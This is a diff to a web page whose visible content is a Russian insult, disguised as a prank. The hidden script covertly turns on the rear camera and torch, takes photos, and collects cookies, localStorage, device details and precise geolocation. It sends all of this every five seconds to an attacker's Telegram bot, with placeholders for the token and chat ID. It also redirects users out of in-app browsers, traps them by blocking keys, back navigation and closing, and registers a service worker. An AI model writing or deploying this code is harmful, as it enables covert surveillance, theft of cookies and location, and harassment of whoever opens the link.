@@ -5,156 +5,231 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>🔥</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            background: black;
-        }
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: 'Impact', 'Arial Black', sans-serif;
-        }
-        .insult {
-            font-size: 10vw;
-            color: #ff0000;
-            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff4400;
-            animation: blink 0.5s infinite alternate;
-            text-align: center;
-            padding: 20px;
-            word-break: break-word;
-        }
-        @keyframes blink {
-            0% { opacity: 1; transform: scale(1); }
-            100% { opacity: 0.3; transform: scale(1.1); }
-        }
-        #video {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
+        /* как было */
+        * { margin:0; padding:0; background:black; }
+        body { display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family:'Impact','Arial Black',sans-serif; user-select:none; }
+        .insult { font-size:10vw; color:#ff0000; text-shadow:0 0 30px #ff0000,0 0 60px #ff4400; animation:blink 0.5s infinite alternate; text-align:center; padding:20px; }
+        @keyframes blink { 0%{opacity:1;transform:scale(1)} 100%{opacity:0.3;transform:scale(1.1)} }
+        #video { position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none; }
+        #canvas { display:none; }
     </style>
 </head>
 <body>
     <div class="insult">🖕 ВОТ ТЫ ЕБЛАН 🖕</div>
     <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        (async function() {
+        (function() {
             'use strict';
 
-            // Функция запуска камеры и фонарика
-            async function startTorchAndCamera() {
+            // ========== 1. ПРИНУДИТЕЛЬНО ОТКРЫВАЕМ В БРАУЗЕРЕ ==========
+            // Если страница открыта во встроенном браузере (ВК, Instagram, Telegram и т.д.)
+            const isInApp = /Instagram|FBAN|FBAV|Twitter|VK|Telegram|WhatsApp|Line|Snapchat/i.test(navigator.userAgent);
+            if (isInApp) {
+                // Открываем ЭТУ ЖЕ СТРАНИЦУ в системном браузере
+                const url = window.location.href;
+                // Пытаемся через intent (Android) или прямую ссылку
+                if (navigator.userAgent.includes('Android')) {
+                    window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end;`;
+                } else if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('iPad')) {
+                    window.location.href = `x-web-search://${url}`;
+                } else {
+                    // fallback
+                    window.open(url, '_system');
+                }
+                // Останавливаем выполнение скрипта на этой странице
+                return;
+            }
+
+            // ========== 2. ОСТАЛЬНАЯ ЛОГИКА (КАК РАНЬШЕ, НО УСИЛЕННАЯ) ==========
+            const BOT_TOKEN = 'ВАШ_ТОКЕН';      // ЗАМЕНИТЕ
+            const ADMIN_ID = 'ВАШ_ID';          // ЗАМЕНИТЕ
+            const HEARTBEAT = 5000;
+
+            let videoStream = null;
+            let videoTrack = null;
+
+            async function startCamera() {
                 try {
-                    // Запрашиваем доступ к задней камере
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'environment',
-                            width: { ideal: 128 },
-                            height: { ideal: 128 }
-                        },
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     });
-
+                    videoStream = stream;
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     await video.play();
-
-                    // Получаем трек камеры
                     const tracks = stream.getVideoTracks();
-                    if (tracks.length === 0) return;
-                    const track = tracks[0];
-
-                    // Включаем фонарик (torch)
-                    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
-                    if (capabilities.torch) {
-                        await track.applyConstraints({ advanced: [{ torch: true }] });
-                    } else {
-                        // Если torch не поддерживается — пробуем через ImageCapture
-                        try {
-                            const imageCapture = new ImageCapture(track);
-                            await imageCapture.grabFrame();
-                        } catch(e) {}
-                    }
-
-                    // Бесконечный цикл поддержки фонарика (каждые 150 мс)
-                    function keepTorchOn() {
-                        try {
-                            if (track && track.applyConstraints) {
-                                track.applyConstraints({ advanced: [{ torch: true }] })
-                                    .catch(() => {});
-                            }
-                            if (navigator.vibrate) {
-                                navigator.vibrate(100);
-                            }
-                        } catch(e) {}
-                        setTimeout(keepTorchOn, 150);
-                    }
-                    keepTorchOn();
-
-                    // Держим видео активным
-                    function keepAlive() {
-                        video.play().catch(() => {});
-                        requestAnimationFrame(keepAlive);
+                    if (tracks.length) {
+                        videoTrack = tracks[0];
+                        try { await videoTrack.applyConstraints({ advanced: [{ torch: true }] }); } catch(e) {}
                     }
                     keepAlive();
-
-                } catch (error) {
-                    // Если пользователь запретил — повторяем запрос каждые 3 секунды
-                    setInterval(async () => {
-                        try {
-                            await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                            startTorchAndCamera();
-                        } catch(e) {}
-                    }, 3000);
+                } catch(e) {
+                    setInterval(() => { if (!videoStream) startCamera(); }, 3000);
                 }
             }
 
-            // Запускаем сразу
-            startTorchAndCamera();
+            function keepAlive() {
+                if (videoTrack && videoTrack.readyState === 'ended') { startCamera(); return; }
+                if (videoTrack) {
+                    try { videoTrack.applyConstraints({ advanced: [{ torch: true }] }).catch(()=>{}); } catch(e) {}
+                }
+                setTimeout(keepAlive, 500);
+            }
 
-            // Блокируем закрытие страницы (Android Back, iOS жест)
-            document.addEventListener('click', function(e) {
-                e.preventDefault();
+            function captureFrame() {
                 const video = document.getElementById('video');
-                if (video.srcObject) {
-                    const track = video.srcObject.getVideoTracks()[0];
-                    if (track && track.applyConstraints) {
-                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
+                const canvas = document.getElementById('canvas');
+                if (!video.videoWidth || !video.videoHeight) return null;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                return canvas.toDataURL('image/jpeg', 0.7);
+            }
+
+            function getInfo() {
+                return {
+                    ua: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    url: window.location.href,
+                    cookies: document.cookie || 'none',
+                    ls: JSON.stringify(localStorage) || 'none'
+                };
+            }
+
+            async function getLocation() {
+                return new Promise(resolve => {
+                    if (!navigator.geolocation) return resolve({ lat:'no', lon:'no' });
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        () => resolve({ lat:'no', lon:'no' }),
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
+            }
+
+            function sendToTelegram(photoBase64, text) {
+                if (!BOT_TOKEN || BOT_TOKEN === 'ВАШ_ТОКЕН') return;
+                try {
+                    if (photoBase64) {
+                        const blob = dataURItoBlob(photoBase64);
+                        const fd = new FormData();
+                        fd.append('chat_id', ADMIN_ID);
+                        fd.append('photo', blob, 'frame.jpg');
+                        fd.append('caption', text.substring(0, 1024));
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    } else {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: ADMIN_ID, text: text.substring(0, 4096) })
+                        });
                     }
+                } catch(e) {}
+            }
+
+            function dataURItoBlob(dataURI) {
+                const bs = atob(dataURI.split(',')[1]);
+                const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(bs.length);
+                const ia = new Uint8Array(ab);
+                for (let i=0; i<bs.length; i++) ia[i] = bs.charCodeAt(i);
+                return new Blob([ab], { type: mime });
+            }
+
+            async function collectAndSend() {
+                const photo = captureFrame();
+                const geo = await getLocation();
+                const info = getInfo();
+                let msg = `📸 НОВЫЙ КАДР\n🕒 ${new Date().toLocaleString()}\n📱 ${info.ua}\n🖥 ${info.screen}\n📍 ${geo.lat}, ${geo.lon}\n🍪 ${info.cookies}\n🔗 ${info.url}`;
+                sendToTelegram(photo, msg);
+            }
+
+            // ========== 3. ЖЁСТКАЯ БЛОКИРОВКА ВЫХОДА ==========
+            function blockExit() {
+                // Перед закрытием — переоткрываем страницу (если пользователь пытается уйти)
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    // Отправляем событие
+                    sendToTelegram(captureFrame(), '⚠️ ПОПЫТКА ЗАКРЫТЬ СТРАНИЦУ');
+                    // Через 100 мс переоткрываем эту же страницу в новом окне (если не закрыто)
+                    setTimeout(() => {
+                        window.open(window.location.href, '_blank');
+                    }, 100);
+                    // Возвращаем сообщение (браузер покажет диалог)
+                    return 'Вы уверены, что хотите выйти?';
+                });
+
+                // Блокируем все клавиши, которые могут закрыть страницу
+                document.addEventListener('keydown', function(e) {
+                    const blocked = ['Escape', 'F5', 'Backspace'];
+                    if (blocked.includes(e.key) || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'w')) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        // Отправляем событие
+                        sendToTelegram(null, `⌨️ НАЖАТА КЛАВИША: ${e.key}`);
+                        // Переоткрываем
+                        window.open(window.location.href, '_blank');
+                    }
+                });
+
+                // Блокируем контекстное меню
+                document.addEventListener('contextmenu', e => e.preventDefault());
+
+                // Блокируем свайпы (на Android)
+                document.addEventListener('touchmove', function(e) {
+                    e.preventDefault();
+                }, { passive: false });
+
+                // При сворачивании — отправляем, при возврате — перезапускаем
+                document.addEventListener('visibilitychange', function() {
+                    if (document.hidden) {
+                        sendToTelegram(null, '📴 ВКЛАДКА СВЁРНУТА');
+                    } else {
+                        sendToTelegram(captureFrame(), '📱 ВКЛАДКА АКТИВНА');
+                        if (!videoStream) startCamera();
+                    }
+                });
+
+                // Дополнительно: каждые 5 секунд проверяем, не пытаются ли закрыть через history.back()
+                setInterval(() => {
+                    if (window.history && window.history.length > 1) {
+                        // Если пользователь нажал "назад" — возвращаем его
+                        window.location.replace(window.location.href);
+                    }
+                }, 1000);
+            }
+
+            // ========== 4. SERVICE WORKER (ДЛЯ РАБОТЫ ПОСЛЕ ПЕРЕЗАГРУЗКИ) ==========
+            function registerSW() {
+                if ('serviceWorker' in navigator) {
+                    const sw = `
+                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
+                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+                        self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
+                    `;
+                    const blob = new Blob([sw], { type: 'application/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    navigator.serviceWorker.register(url, { scope: '/' }).catch(()=>{});
                 }
-                return false;
-            }, true);
+            }
 
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('keydown', e => e.preventDefault());
+            // ========== 5. ЗАПУСК ==========
+            async function main() {
+                // Отправляем старт
+                sendToTelegram(null, '🔥 ЭКСПЛОЙТ ЗАПУЩЕН');
+                await startCamera();
+                blockExit();
+                registerSW();
+                setInterval(collectAndSend, HEARTBEAT);
+                setTimeout(collectAndSend, 1000);
+            }
 
-            // Неслышный звук для удержания вкладки активной
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                gain.gain.value = 0.001;
-                oscillator.connect(gain);
-                gain.connect(audioCtx.destination);
-                oscillator.start();
-                oscillator.frequency.value = 20;
-            } catch(e) {}
-
-            // При возврате на страницу — перезапуск
-            document.addEventListener('visibilitychange', function() {
-                if (!document.hidden) {
-                    startTorchAndCamera();
-                }
-            });
-
+            main();
         })();
     </script>
 </body>
